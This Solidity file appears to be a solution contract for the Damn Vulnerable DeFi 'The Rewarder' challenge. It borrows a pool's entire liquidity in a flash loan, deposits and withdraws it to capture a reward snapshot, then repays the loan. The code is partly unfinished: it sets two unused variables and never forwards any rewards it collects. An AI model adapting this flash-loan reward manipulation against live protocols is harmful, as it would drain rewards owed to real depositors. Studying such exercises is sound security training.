// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {AccountingToken} from "./AccountingToken.sol";
import {DamnValuableToken} from "./DamnValuableToken.sol";

contract TheRewarderAttacker {
    TheRewarderPool private rewarderPool;
    FlashLoanerPool private flashLoanPool;
    DamnValuableToken private liquidityToken;

    constructor(TheRewarderPool _rewarderPool, FlashLoanerPool _flashLoanPool) public {
        rewarderPool = _rewarderPool;
        flashLoanPool = _flashLoanPool;
        liquidityToken = DamnValuableToken(rewarderPool.liquidityToken());
    }

    function attack() external {
        AccountingToken at = rewarderPool.accountingToken();
        uint256 lastSnapshotId = rewarderPool.lastSnapshotIdForRewards();

        // Loan the whole pool liquidity
        flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), type(uint256).max);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}
